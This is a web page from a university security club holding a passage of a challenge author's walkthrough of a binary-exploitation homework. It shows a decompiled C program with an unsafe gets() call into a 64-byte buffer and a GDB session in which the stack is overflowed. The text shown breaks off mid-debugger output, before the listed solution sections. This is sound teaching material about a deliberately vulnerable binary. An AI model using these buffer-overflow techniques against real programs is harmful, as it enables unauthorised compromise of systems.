<!doctype html><html lang=en class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Challenge author walkthrough of the binary exploitation homework for UCSC's CSE-132 Fall 2024 class. Hopefully you had somewhat of a good time attempting these challenges, if you're curious about binary exploitation in general, I'd highly suggest trying some challenges on pwn.college."><meta name=author content="Slug Security"><link href="https://slugsec.ucsc.edu/writeups/cse-132-pwn-hw-walkthrough/" rel="canonical"><link href=../cse-132-rev-hw-walkthrough/ rel=prev><link rel=alternate type=application/rss+xml title="RSS feed" href=../../feed_rss_created.xml><link rel=alternate type=application/rss+xml title="RSS feed of updated content" href=../../feed_rss_updated.xml><link rel=icon href=../../_assets/favicon.ico><meta name=generator content="mkdocs-1.6.1, mkdocs-material-9.5.20+insiders-4.53.8"><title>CSE-132 Pwn HW Walkthrough - Slug Security</title><link rel=stylesheet href=../../assets/stylesheets/main.d5b5f0fd.min.css><link rel=stylesheet href=../../assets/stylesheets/palette.ab4e12ef.min.css><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=HelveticaNeue-Medium:300,300i,400,400i,700,700i%7CJetBrainsMono-Nerd:400,400i,700,700i&amp;display=fallback"><style>:root{--md-text-font:"HelveticaNeue-Medium";--md-code-font:"JetBrainsMono-Nerd"}</style><link rel=stylesheet href=../../css/timeago.css><link rel=stylesheet href=../../_assets/css/extra-fonts.css><link rel=stylesheet href=../../_assets/css/custom-header.css><link rel=stylesheet href=../../_assets/css/custom-footer.css><link rel=stylesheet href=../../_assets/css/blog-listing.css><link rel=stylesheet href=../../_assets/css/extras.css><link rel=stylesheet href=../../_assets/css/sponsors.css><link rel=stylesheet href=../../_assets/css/highlights.css><link rel=stylesheet href=../../_assets/css/officers.css><link rel=stylesheet href=../../_assets/css/home.css><script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script><script id=__analytics>function __md_analytics(){function n(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],n("js",new Date),n("config","G-YFR850WSX3"),document.addEventListener("DOMContentLoaded",function(){document.forms.search&&document.forms.search.query.addEventListener("blur",function(){this.value&&n("event","search",{search_term:this.value})}),document$.subscribe(function(){var a=document.forms.feedback;if(void 0!==a)for(var e of a.querySelectorAll("[type=submit]"))e.addEventListener("click",function(e){e.preventDefault();var t=document.location.pathname,e=this.getAttribute("data-md-value");n("event","feedback",{page:t,data:e}),a.firstElementChild.disabled=!0;e=a.querySelector(".md-feedback__note [data-md-value='"+e+"']");e&&(e.hidden=!1)}),a.hidden=!1}),location$.subscribe(function(e){n("config","G-YFR850WSX3",{page_path:e.pathname})})});var e=document.createElement("script");e.async=!0,e.src="https://www.googletagmanager.com/gtag/js?id=G-YFR850WSX3",document.getElementById("__analytics").insertAdjacentElement("afterEnd",e)}</script><script>"undefined"!=typeof __md_analytics&&__md_analytics()</script><meta property=og:type content=website><meta property=og:title content="CSE-132 Pwn HW Walkthrough - Slug Security"><meta property=og:description content="Challenge author walkthrough of the binary exploitation homework for UCSC's CSE-132 Fall 2024 class. Hopefully you had somewhat of a good time attempting these challenges, if you're curious about binary exploitation in general, I'd highly suggest trying some challenges on pwn.college."><meta property=og:image content=https://slugsec.ucsc.edu/assets/images/social/writeups/cse-132-pwn-hw-walkthrough.png><meta property=og:image:type content=image/png><meta property=og:image:width content=1200><meta property=og:image:height content=630><meta content=https://slugsec.ucsc.edu/writeups/cse-132-pwn-hw-walkthrough/ property=og:url><meta property=twitter:card content=summary_large_image><meta property=twitter:title content="CSE-132 Pwn HW Walkthrough - Slug Security"><meta property=twitter:description content="Challenge author walkthrough of the binary exploitation homework for UCSC's CSE-132 Fall 2024 class. Hopefully you had somewhat of a good time attempting these challenges, if you're curious about binary exploitation in general, I'd highly suggest trying some challenges on pwn.college."><meta property=twitter:image content=https://slugsec.ucsc.edu/assets/images/social/writeups/cse-132-pwn-hw-walkthrough.png> <link href="../../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>
    html.glightbox-open { overflow: initial; height: 100%; }
    .gslide-title { margin-top: 0px; user-select: text; }
    .gslide-desc { color: #666; user-select: text; }
    .gslide-image img { background: white; }
    .gscrollbar-fixer { padding-right: 15px; }
    .gdesc-inner { font-size: 0.75rem; }
    body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color);}
    body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color);}
    body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color);}</style> <script src="../../assets/javascripts/glightbox.min.js"></script></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=deep-orange data-md-color-accent=deep-orange> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#simple-win class=md-skip> Skip to content </a> </div> <div data-md-component=announce> <aside class=md-banner> <div class="md-banner__inner md-grid md-typeset"> <button class="md-banner__button md-icon" aria-label="Don't show this again"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg> </button> Thank you to our members and donors for supporting us in creating cool cybersecurity learning experiences at UCSC. Stay tuned for updates about our upcoming cyber range. </div> <script>var content,el=document.querySelector("[data-md-component=announce]");el&&(content=el.querySelector(".md-typeset"),__md_hash(content.innerHTML)===__md_get("__announce")&&(el.hidden=!0))</script> </aside> </div> <!-- Header --> <header class="md-header md-header--shadow md-header--lifted" data-md-component=header> <nav class="md-header__inner md-grid" aria-label=Header> <!-- Button to open drawer --> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg> </label> <!-- Header title --> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> Slug Security </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> CSE-132 Pwn HW Walkthrough </span> </div> </div> </div> <!-- Navigation tabs (sticky) --> <nav class=md-tabs aria-label=Tabs data-md-component=tabs> <div class=md-grid> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../../posts/ class=md-tabs__link> /Posts </a> </li> <li class="md-tabs__item md-tabs__item--active"> <a href=../ class=md-tabs__link> /Writeups </a> </li> <li class=md-tabs__item> <a href=../../events/ class=md-tabs__link> /Events </a> </li> <li class=md-tabs__item> <a href=../.. class="md-tabs__link md-tabs__link--banner"> Slug<br>Security </a> </li> <li class=md-tabs__item> <a href=../../highlights/ class=md-tabs__link> /Highlights </a> </li> <li class=md-tabs__item> <a href=../../about/faqs/ class=md-tabs__link> /About </a> </li> <li class=md-tabs__item> <a href=../../join/ class="md-tabs__link md-tabs__link--button"> /Join </a> </li> </ul> </div> </nav> <!-- Color palette toggle --> <form class=md-header__option data-md-component=palette> <input class=md-option data-md-color-media data-md-color-scheme=slate data-md-color-primary=deep-orange data-md-color-accent=deep-orange aria-hidden=true type=radio name=__palette id=__palette_0> </form> <!-- User preference: color palette --> <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script> <!-- Button to open search modal --> </header> <div class=md-container data-md-component=container> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation hidden> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary md-nav--lifted" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../.. title="Slug Security" class="md-nav__button md-logo" aria-label="Slug Security" data-md-component=logo> <img src=../../_assets/logo.png alt=logo> </a> Slug Security </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--pruned md-nav__item--nested"> <a href=../../posts/ class=md-nav__link> <span class=md-ellipsis> Posts </span> <span class="md-nav__icon md-icon"></span> </a> </li> <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_2 checked> <div class="md-nav__link md-nav__container"> <a href=../ class="md-nav__link "> <span class=md-ellipsis> Writeups </span> </a> <label class="md-nav__link " for=__nav_2 id=__nav_2_label tabindex> <span class="md-nav__icon md-icon"></span> </label> </div> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_2_label aria-expanded=true> <label class=md-nav__title for=__nav_2> <span class="md-nav__icon md-icon"></span> Writeups </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_2_2> <label class=md-nav__link for=__nav_2_2 id=__nav_2_2_label tabindex> <span class=md-ellipsis> Archive </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_2_2_label aria-expanded=false> <label class=md-nav__title for=__nav_2_2> <span class="md-nav__icon md-icon"></span> Archive </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../archive/2024/ class=md-nav__link> <span class=md-ellipsis> <span class=md-typeset> 2024 </span> </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_2_3> <label class=md-nav__link for=__nav_2_3 id=__nav_2_3_label tabindex> <span class=md-ellipsis> Categories </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_2_3_label aria-expanded=false> <label class=md-nav__title for=__nav_2_3> <span class="md-nav__icon md-icon"></span> Categories </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../category/binary-exploitation/ class=md-nav__link> <span class=md-ellipsis> <span class=md-typeset> Binary Exploitation </span> </span> </a> </li> <li class=md-nav__item> <a href=../category/general/ class=md-nav__link> <span class=md-ellipsis> <span class=md-typeset> General </span> </span> </a> </li> <li class=md-nav__item> <a href=../category/ghidra/ class=md-nav__link> <span class=md-ellipsis> <span class=md-typeset> Ghidra </span> </span> </a> </li> <li class=md-nav__item> <a href=../category/golang/ class=md-nav__link> <span class=md-ellipsis> <span class=md-typeset> Golang </span> </span> </a> </li> <li class=md-nav__item> <a href=../category/rop/ class=md-nav__link> <span class=md-ellipsis> <span class=md-typeset> ROP </span> </span> </a> </li> <li class=md-nav__item> <a href=../category/reverse-engineering/ class=md-nav__link> <span class=md-ellipsis> <span class=md-typeset> Reverse Engineering </span> </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_2_4> <label class=md-nav__link for=__nav_2_4 id=__nav_2_4_label tabindex> <span class=md-ellipsis> Authors </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_2_4_label aria-expanded=false> <label class=md-nav__title for=__nav_2_4> <span class="md-nav__icon md-icon"></span> Authors </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../author/fbad/ class=md-nav__link> <span class=md-ellipsis> <span class=md-typeset> fbad </span> </span> </a> </li> <li class=md-nav__item> <a href=../author/maxwell/ class=md-nav__link> <span class=md-ellipsis> <span class=md-typeset> maxwell </span> </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../events/ class=md-nav__link> <span class=md-ellipsis> Events </span> </a> </li> <li class=md-nav__item> <a href=../../highlights/ class=md-nav__link> <span class=md-ellipsis> Highlights </span> </a> </li> <li class="md-nav__item md-nav__item--pruned md-nav__item--nested"> <a href=../../about/faqs/ class=md-nav__link> <span class=md-ellipsis> About </span> <span class="md-nav__icon md-icon"></span> </a> </li> <li class=md-nav__item> <a href=../../join/ class=md-nav__link> <span class=md-ellipsis> Join </span> </a> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#simple-win class=md-nav__link> <span class=md-ellipsis> <span class=md-typeset> Simple Win </span> </span> </a> <nav class=md-nav aria-label="Simple Win"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#decompiled-code class=md-nav__link> <span class=md-ellipsis> <span class=md-typeset> Decompiled Code </span> </span> </a> </li> <li class=md-nav__item> <a href=#stack-misalignment class=md-nav__link> <span class=md-ellipsis> <span class=md-typeset> Stack Misalignment </span> </span> </a> </li> <li class=md-nav__item> <a href=#final-solution class=md-nav__link> <span class=md-ellipsis> <span class=md-typeset> Final Solution </span> </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#simple-rop class=md-nav__link> <span class=md-ellipsis> <span class=md-typeset> Simple ROP </span> </span> </a> <nav class=md-nav aria-label="Simple ROP"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#decompiled-code_1 class=md-nav__link> <span class=md-ellipsis> <span class=md-typeset> Decompiled Code </span> </span> </a> </li> <li class=md-nav__item> <a href=#passing-in-a-password class=md-nav__link> <span class=md-ellipsis> <span class=md-typeset> Passing In A Password </span> </span> </a> </li> <li class=md-nav__item> <a href=#final-solution_1 class=md-nav__link> <span class=md-ellipsis> <span class=md-typeset> Final Solution </span> </span> </a> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class="md-content md-content--post" data-md-component=content> <div class="md-sidebar md-sidebar--post" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class="md-sidebar__inner md-post"> <nav class="md-nav md-nav--primary"> <div class=md-post__back> <div class="md-nav__title md-nav__container"> <a href=../ class=md-nav__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg> <span class=md-ellipsis> Back to index </span> </a> </div> </div> <div class="md-post__authors md-typeset"> <div class="md-profile md-post__profile"> <span class="md-author md-author--long"> <img src=/_assets/images/authors/fbad.png alt=fbad> </span> <span class=md-profile__description> <strong> <a href="https://fbad.me">fbad</a> </strong> <br> leader of the cybermob </span> </div> </div> <ul class="md-post__meta md-nav__list"> <li class="md-nav__item md-nav__item--section"> <div class=md-post__title> <span class=md-ellipsis> Metadata </span> </div> <nav class=md-nav> <ul class=md-nav__list> <li class=md-nav__item> <div class=md-nav__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 19H5V8h14m-3-7v2H8V1H6v2H5c-1.11 0-2 .89-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2h-1V1m-1 11h-5v5h5v-5Z"/></svg> <time datetime="2024-12-10 00:00:00" class=md-ellipsis>December 10, 2024</time> </div> </li> <li class=md-nav__item> <div class=md-nav__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9 3v15h3V3H9m3 2 4 13 3-1-4-13-3 1M5 5v13h3V5H5M3 19v2h18v-2H3Z"/></svg> <span class=md-ellipsis> in <a href=../category/binary-exploitation/ >Binary Exploitation</a>, <a href=../category/rop/ >ROP</a></span> </div> </li> <li class=md-nav__item> <div class=md-nav__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 20a8 8 0 0 0 8-8 8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8m0-18a10 10 0 0 1 10 10 10 10 0 0 1-10 10C6.47 22 2 17.5 2 12A10 10 0 0 1 12 2m.5 5v5.25l4.5 2.67-.75 1.23L11 13V7h1.5Z"/></svg> <span class=md-ellipsis> 12 min read </span> </div> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <article class="md-content__inner md-typeset"> <h1>CSE-132 Pwn HW Walkthrough</h1> <p class=teaser>Challenge author walkthrough of the binary exploitation homework for UCSC's CSE-132 Fall 2024 class. Hopefully you had somewhat of a good time attempting these challenges, if you're curious about binary exploitation in general, I'd highly suggest trying some challenges on <a href="https://pwn.college/">pwn.college</a>.</p> <!-- more --> <h2 id=simple-win>Simple Win<a class=headerlink href=#simple-win title="Permanent link">¶</a></h2> <div class="admonition info annotate"> <p class=admonition-title>Challenge Description</p> <p>Made a pretty simple C binary, nothing special...</p> <p>Can you win?</p> <p>Provided: ./chall (1)</p> </div> <ol> <li>chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=41fbd6c57d97296ebcc8327057a04491bdb9d34c, for GNU/Linux 3.2.0, not stripped</li> </ol> <p>As with any challenge, first we should try running this program normally:</p> <div class="language-bash highlight"><pre><span></span><code><span id=__span-0-1><a href=#__codelineno-0-1 id=__codelineno-0-1 name=__codelineno-0-1></a>$<span class=w> </span>./chall<span class=w> </span>
</span><span id=__span-0-2><a href=#__codelineno-0-2 id=__codelineno-0-2 name=__codelineno-0-2></a>hey<span class=w> </span>bud,<span class=w> </span>how<span class=s1>'s it goin'</span>?<span class=w> </span>what<span class=s1>'s your name?</span>
</span><span id=__span-0-3><a href=#__codelineno-0-3 id=__codelineno-0-3 name=__codelineno-0-3></a><span class=s1>&gt; fbaaaaaaaaaad</span>
</span><span id=__span-0-4><a href=#__codelineno-0-4 id=__codelineno-0-4 name=__codelineno-0-4></a><span class=s1>hey hey nice to meet ya, fbaaaaaaaaaad</span>
</span><span id=__span-0-5><a href=#__codelineno-0-5 id=__codelineno-0-5 name=__codelineno-0-5></a><span class=s1>just don'</span>t<span class=w> </span>be<span class=w> </span>snooping<span class=w> </span>around<span class=w> </span>my<span class=w> </span>code<span class=w> </span>and<span class=w> </span>we<span class=err>'</span>ll<span class=w> </span>get<span class=w> </span>along<span class=w> </span>fine...
</span></code></pre></div> <p>Ok, so it seems like it prompted us for a name, then not much from there. Quickly running this through Ghidra to get a decompilation to understand what is happening, we see the following:</p> <h3 id=decompiled-code>Decompiled Code<a class=headerlink href=#decompiled-code title="Permanent link">¶</a></h3> <div class="language-c highlight"><pre><span></span><code><span id=__span-1-1><a href=#__codelineno-1-1 id=__codelineno-1-1 name=__codelineno-1-1></a><span class=kt>void</span><span class=w> </span><span class=nf>win</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-1-2><a href=#__codelineno-1-2 id=__codelineno-1-2 name=__codelineno-1-2></a><span class=w>  </span><span class=kt>char</span><span class=w> </span><span class=n>local_118</span><span class=w> </span><span class=p>[</span><span class=mi>264</span><span class=p>];</span>
</span><span id=__span-1-3><a href=#__codelineno-1-3 id=__codelineno-1-3 name=__codelineno-1-3></a><span class=w>  </span><span class=kt>FILE</span><span class=w> </span><span class=o>*</span><span class=n>local_10</span><span class=p>;</span>
</span><span id=__span-1-4><a href=#__codelineno-1-4 id=__codelineno-1-4 name=__codelineno-1-4></a>
</span><span id=__span-1-5><a href=#__codelineno-1-5 id=__codelineno-1-5 name=__codelineno-1-5></a><span class=w>  </span><span class=n>local_10</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>fopen</span><span class=p>(</span><span class=s>"flag.txt"</span><span class=p>,</span><span class=s>"r"</span><span class=p>);</span>
</span><span id=__span-1-6><a href=#__codelineno-1-6 id=__codelineno-1-6 name=__codelineno-1-6></a><span class=w>  </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>local_10</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=p>(</span><span class=kt>FILE</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-1-7><a href=#__codelineno-1-7 id=__codelineno-1-7 name=__codelineno-1-7></a><span class=w>    </span><span class=n>puts</span><span class=p>(</span><span class=s>":3c hmm how</span><span class=se>\'</span><span class=s>d you get here?? try this on the real server to get the flag..."</span><span class=p>);</span>
</span><span id=__span-1-8><a href=#__codelineno-1-8 id=__codelineno-1-8 name=__codelineno-1-8></a><span class=w>  </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-1-9><a href=#__codelineno-1-9 id=__codelineno-1-9 name=__codelineno-1-9></a><span class=w>    </span><span class=n>fgets</span><span class=p>(</span><span class=n>local_118</span><span class=p>,</span><span class=mh>0x100</span><span class=p>,</span><span class=n>local_10</span><span class=p>);</span>
</span><span id=__span-1-10><a href=#__codelineno-1-10 id=__codelineno-1-10 name=__codelineno-1-10></a><span class=w>    </span><span class=n>puts</span><span class=p>(</span><span class=n>local_118</span><span class=p>);</span>
</span><span id=__span-1-11><a href=#__codelineno-1-11 id=__codelineno-1-11 name=__codelineno-1-11></a><span class=w>    </span><span class=n>fclose</span><span class=p>(</span><span class=n>local_10</span><span class=p>);</span>
</span><span id=__span-1-12><a href=#__codelineno-1-12 id=__codelineno-1-12 name=__codelineno-1-12></a><span class=w>  </span><span class=p>}</span>
</span><span id=__span-1-13><a href=#__codelineno-1-13 id=__codelineno-1-13 name=__codelineno-1-13></a>
</span><span id=__span-1-14><a href=#__codelineno-1-14 id=__codelineno-1-14 name=__codelineno-1-14></a><span class=w>  </span><span class=k>return</span><span class=p>;</span>
</span><span id=__span-1-15><a href=#__codelineno-1-15 id=__codelineno-1-15 name=__codelineno-1-15></a><span class=p>}</span>
</span><span id=__span-1-16><a href=#__codelineno-1-16 id=__codelineno-1-16 name=__codelineno-1-16></a>
</span><span id=__span-1-17><a href=#__codelineno-1-17 id=__codelineno-1-17 name=__codelineno-1-17></a><span class=n>undefined8</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-1-18><a href=#__codelineno-1-18 id=__codelineno-1-18 name=__codelineno-1-18></a><span class=w>  </span><span class=kt>char</span><span class=w> </span><span class=n>local_48</span><span class=w> </span><span class=p>[</span><span class=mi>64</span><span class=p>];</span>
</span><span id=__span-1-19><a href=#__codelineno-1-19 id=__codelineno-1-19 name=__codelineno-1-19></a>
</span><span id=__span-1-20><a href=#__codelineno-1-20 id=__codelineno-1-20 name=__codelineno-1-20></a><span class=w>  </span><span class=n>setbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,(</span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>);</span>
</span><span id=__span-1-21><a href=#__codelineno-1-21 id=__codelineno-1-21 name=__codelineno-1-21></a><span class=w>  </span><span class=n>setbuf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,(</span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>);</span>
</span><span id=__span-1-22><a href=#__codelineno-1-22 id=__codelineno-1-22 name=__codelineno-1-22></a><span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>"hey bud, how</span><span class=se>\'</span><span class=s>s it goin</span><span class=se>\'</span><span class=s>? what</span><span class=se>\'</span><span class=s>s your name?"</span><span class=p>);</span>
</span><span id=__span-1-23><a href=#__codelineno-1-23 id=__codelineno-1-23 name=__codelineno-1-23></a><span class=w>  </span><span class=n>printf</span><span class=p>(</span><span class=s>"&gt; "</span><span class=p>);</span>
</span><span id=__span-1-24><a href=#__codelineno-1-24 id=__codelineno-1-24 name=__codelineno-1-24></a><span class=w>  </span><span class=n>gets</span><span class=p>(</span><span class=n>local_48</span><span class=p>);</span>
</span><span id=__span-1-25><a href=#__codelineno-1-25 id=__codelineno-1-25 name=__codelineno-1-25></a><span class=w>  </span><span class=n>printf</span><span class=p>(</span><span class=s>"hey hey nice to meet ya, %s</span><span class=se>\n</span><span class=s>"</span><span class=p>,</span><span class=n>local_48</span><span class=p>);</span>
</span><span id=__span-1-26><a href=#__codelineno-1-26 id=__codelineno-1-26 name=__codelineno-1-26></a><span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>"just don</span><span class=se>\'</span><span class=s>t be snooping around my code and we</span><span class=se>\'</span><span class=s>ll get along fine..."</span><span class=p>);</span>
</span><span id=__span-1-27><a href=#__codelineno-1-27 id=__codelineno-1-27 name=__codelineno-1-27></a>
</span><span id=__span-1-28><a href=#__codelineno-1-28 id=__codelineno-1-28 name=__codelineno-1-28></a><span class=w>  </span><span class=k>return</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
</span><span id=__span-1-29><a href=#__codelineno-1-29 id=__codelineno-1-29 name=__codelineno-1-29></a><span class=p>}</span>
</span></code></pre></div> <p>Clearly, this is a simple ret2win (a buffer overflow attack that redirects execution to a "win" function) challenge. The vulnerable line in our case is the gets() function. If you're unfamiliar, gets() allows you to input data larger than the allocated buffer size, enabling you to overflow the stack and override registers. Let's show an example of this with GDB:</p> <div class="language-text highlight"><pre><span></span><code><span id=__span-2-1><a href=#__codelineno-2-1 id=__codelineno-2-1 name=__codelineno-2-1></a>$ gdb -q chall 
</span><span id=__span-2-2><a href=#__codelineno-2-2 id=__codelineno-2-2 name=__codelineno-2-2></a>Reading symbols from chall...
</span><span id=__span-2-3><a href=#__codelineno-2-3 id=__codelineno-2-3 name=__codelineno-2-3></a>(No debugging symbols found in chall)
</span><span id=__span-2-4><a href=#__codelineno-2-4 id=__codelineno-2-4 name=__codelineno-2-4></a>
</span><span id=__span-2-5><a href=#__codelineno-2-5 id=__codelineno-2-5 name=__codelineno-2-5></a>gef➤  run
</span><span id=__span-2-6><a href=#__codelineno-2-6 id=__codelineno-2-6 name=__codelineno-2-6></a>hey bud, how's it goin'? what's your name?
</span><span id=__span-2-7><a href=#__codelineno-2-7 id=__codelineno-2-7 name=__codelineno-2-7></a>&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span><span id=__span-2-8><a href=#__codelineno-2-8 id=__codelineno-2-8 name=__codelineno-2-8></a>
</span><span id=__span-2-9><a href=#__codelineno-2-9 id=__codelineno-2-9 name=__codelineno-2-9></a>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
</span><span id=__span-2-10><a href=#__codelineno-2-10 id=__codelineno-2-10 name=__codelineno-2-10></a>$rax   : 0x0               
</span><span id=__span-2-11><a href=#__codelineno-2-11 id=__codelineno-2-11 name=__codelineno-2-11></a>$rbx   : 0x00007fffffffdb48  →  0x00007fffffffdf03  →  "/pwn-simple-win/[...]"
</span><span id=__span-2-12><a href=#__codelineno-2-12 id=__codelineno-2-12 name=__codelineno-2-12></a>$rcx   : 0x00007ffff7eb32c0  →  0x5877fffff0003d48 ("H="?)
</span><span id=__span-2-13><a href=#__codelineno-2-13 id=__codelineno-2-13 name=__codelineno-2-13></a>$rdx   : 0x1               
</span><span id=__span-2-14><a href=#__codelineno-2-14 id=__codelineno-2-14 name=__codelineno-2-14></a>$rsp   : 0x00007fffffffda38  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAA"
</span><span id=__span-2-15><a href=#__codelineno-2-15 id=__codelineno-2-15 name=__codelineno-2-15></a>$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
</span><span id=__span-2-16><a href=#__codelineno-2-16 id=__codelineno-2-16 name=__codelineno-2-16></a>$rsi   : 0x1               
</span><span id=__span-2-17><a href=#__codelineno-2-17 id=__codelineno-2-17 name=__codelineno-2-17></a>$rdi   : 0x00007ffff7f8fa10  →  0x0000000000000000
</span><span id=__span-2-18><a href=#__codelineno-2-18 id=__codelineno-2-18 name=__codelineno-2-18></a>$rip   : 0x000000000040128f  →  &lt;main+148&gt; ret 
</span><span id=__span-2-19><a href=#__codelineno-2-19 id=__codelineno-2-19 name=__codelineno-2-19></a>$r8    : 0x0000000000405305  →  0x0000000000000000
</span><span id=__span-2-20><a href=#__codelineno-2-20 id=__codelineno-2-20 name=__codelineno-2-20></a>$r9    : 0x73              
</span><span id=__span-2-21><a href=#__codelineno-2-21 id=__codelineno-2-21 name=__codelineno-2-21></a>$r10   : 0x0               
</span><span id=__span-2-22><a href=#__codelineno-2-22 id=__codelineno-2-22 name=__codelineno-2-22></a>$r11   : 0x202             
</span><span id=__span-2-23><a href=#__codelineno-2-23 id=__codelineno-2-23 name=__codelineno-2-23></a>$r12   : 0x0               
